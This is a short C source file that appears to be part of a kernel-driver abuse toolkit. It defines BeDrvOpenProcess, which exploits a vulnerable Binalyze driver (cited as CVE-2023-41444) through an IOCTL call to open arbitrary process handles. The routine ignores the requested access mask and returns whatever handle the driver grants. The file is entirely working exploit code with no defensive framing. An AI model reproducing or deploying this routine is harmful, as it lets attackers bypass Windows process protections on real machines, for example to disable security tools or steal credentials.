/* Binalyze driver routines. */

#include "global.h"
#include "idrv/binalyze.h"

//
// Based on CVE-2023-41444
//

/*
 * BeDrvOpenProcess
 *
 * Purpose:
 *
 * Open process via Binalyze driver.
 *
 */
BOOL WINAPI BeDrvOpenProcess(_In_ HANDLE DeviceHandle,
                             _In_ HANDLE ProcessId,
                             _In_ ACCESS_MASK DesiredAccess,
                             _Out_ PHANDLE ProcessHandle) {
    UNREFERENCED_PARAMETER(DesiredAccess);

    BOOL bResult = FALSE;
    DWORD data = HandleToUlong(ProcessId);

    bResult = supCallDriver(DeviceHandle, IOCTL_IREC_OPEN_PROCESS, &data,
                            sizeof(data), &data, sizeof(data));

    *ProcessHandle = UlongToHandle(data);

    return bResult;
}
